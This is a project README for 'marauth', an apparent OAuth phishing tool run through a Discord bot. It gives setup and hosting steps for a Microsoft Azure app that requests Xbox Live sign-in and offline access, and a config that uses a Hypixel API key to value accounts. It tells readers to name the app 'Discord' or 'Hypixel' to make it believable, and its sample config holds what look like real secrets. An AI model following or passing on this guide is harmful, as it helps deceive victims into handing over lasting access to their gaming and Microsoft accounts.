# Welcome to marauth 👋

![Version](https://img.shields.io/badge/version-1.0-blue.svg?cacheSeconds=2592000)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](#)
![GitHub downloads](https://img.shields.io/badge/dynamic/json?label=Views&query=value&url=https://api.countapi.xyz/hit/liquidised/public-marauth)

> This is an oAuth Generator made by marcat & Gute Nacht. It is controlled by a single MongoDB Database and a Discord Bot.

<details>
    <summary>Resources used in MarAuth!</summary>

* [NodeJS](https://nodejs.org/en/)
* [MongoDB (database)](https://www.mongodb.com/)
* [Express (website)](https://expressjs.com/)
* [EJS (html rendering)](https://ejs.co/)
* [Axios (api calls)](https://www.npmjs.com/package/axios)
* [IPLIM (rate limiting by dxxxxy)](https://www.npmjs.com/package/iplim)

</details>

# Bot

The bot is linked [here](https://github.com/liquidised/marauth-bot) because I couldn't care less to make the README.md this fucking big, please do this first and then we can work on the bot.

# Config

<details>
    <summary>Config File</summary>

This is what your Config.json file should look like in the end. You can find out how to make it look like this with the resources below.

> Also most of this markdown code is skidded from Gute Nacht, so thanks for that.

```json

{
    "networth": { // hypixel api key
        "apiKey": "624dadfb-f2e9-52b4-18d0-7d1e8a053316"
    },

    "mongodb": { //mongodb connection string (you can get this from mongodb atlas) there are prolly tutorials on youtube
        "connectionstring": "mongodb+srv://username:password@cluster0.awxurla.mongodb.net/test"
    },

    "azure" : {
        /*
        the stateequalsurl needs to be changed
        change clientidhere to the one under this
        change redirecturihere to the redirect_uri value under this
        */
        "stateequalsurl": "https://login.live.com/oauth20_authorize.srf?client_id=clientidhere&response_type=code&redirect_uri=redirecturihere&scope=XboxLive.signin+offline_access&state=",
        "client_id": "4c5c7121-10b2-4c53-120e-41a444fe6",
        "client_secret": "rtaQ~do~aDd~sxXcWFAOigkcQCc9Dao~ggqpscml",
        "redirect_uri": "http://localhost:1025/verifying"
    }
}
```

</details>

<details>
    <summary>Microsoft Azure Application Part 1</summary>

## Azure App Registration Part 1

*Contrary to popular belief, this is actually very easy!*
First, make sure you have a Microsoft Account. If you don't, you can make one [here](https://account.microsoft.com/account).
Then, go ahead and sign up for Microsoft Azure. You can do that [here](https://azure.microsoft.com/en-us/free/).

Secondly, visit [Microsoft Azure&#39;s](https://portal.azure.com/#create/hub) website.

Next, at the search top bar, search for "App registrations"

Then, click "New registration" in the top left corner

Next, type any name you want. To make it believable, you can choose something like "Discord" or "Hypixel"

</details>

<details>
    <summary>Hosting Tutorial</summary>

## Hosting

If you want to host it on a vps, you can use DigitalOcean and get a free 200$ of credit for 2 months for only paying 5$ (i really recommend this if you have the money.)

You can also use [OnRender](https://onrender.com/), it's free and just like heroku but with super slow upload times but it works perfectly fine if you have under 5 people using your oAuth, otherwise please use DigitalOcean.

Once you have your OnRender link, go back to App Registration.

</details>

<details>
    <summary>Microsoft Azure Application Part 2</summary>

## Azure App Registration Part 2

Now, set the redirect uri to your onrender link or your vps if it applies to you. Then set the platform to web.

Reopen config.json and set the client_id to the Application (client) ID on the Azure page.

Then, back on Azure, click "Add a certificate or secret" under Client credentials.

Click "New client secret", the name can be anything you want. It doesn't matter.

Then, click add and copy the Secret ID and set that to client_secret in the config.

Set the redirect uri you put to the azure as redirect_uri in config

The change the stateequalsurl to this, but change the client_id to the one you got from azure and change the redirect uri to the one you have set in the config.json file.

[https://login.live.com/oauth20_authorize.srf?client_id=`clientidhere`&amp;response_type=code&amp;redirect_uri=`redirecturlhere`&amp;scope=XboxLive.signin+offline_access&amp;state=](https://login.live.com/oauth20_authorize.srf?client_id=`clientidhere`&response_type=code&redirect_uri=`redirecturlhere`&scope=XboxLive.signin+offline_access&state=)

</details>

# Installation

<details>
    <summary>Installation</summary>

First things first, download NodeJS from this link [NodeJS](https://nodejs.org/en/), I would recommend getting the LTS version (Long Time Support)
After the last step you might need to restart, you can test this out by putting the command ``node`` in your command line, if it says unknown command, restart.

Now to install this repository into your folder you can do this command in the CMD line.

> If you don't have GIT installed you must install it [here](https://git-scm.com/downloads)

```git
git clone https://github.com/liquidised/marauth-development.git
```

Now, you must have filled out the config.json file or it will not work. You can find how to do this in the Config area.

Now do this command.

```sh
npm i
```

</details>

## Usage

<details>
    <summary>Usage</summary>

```sh
node .
```

If it says you are missing a package, then do this command, ``npm i packagename``

> ``Error: Cannot find module 'iplim'`` is what the error would look like, so you would do ``npm i iplim`` and so forth.

</details>

## Authors

👤 **marcat & gute nacht**

* marcat's Github: [@marcat](https://github.com/liquidised)
* Gute Nacht's Github: [@gutenacht](https://github.com/gutenacht0221)

## Show your support

Give a ⭐️ if this project helped you!

I will not be making a video tutorial as if you cannot do this you shouldn't be running an oAuth in the first place. 💓

---
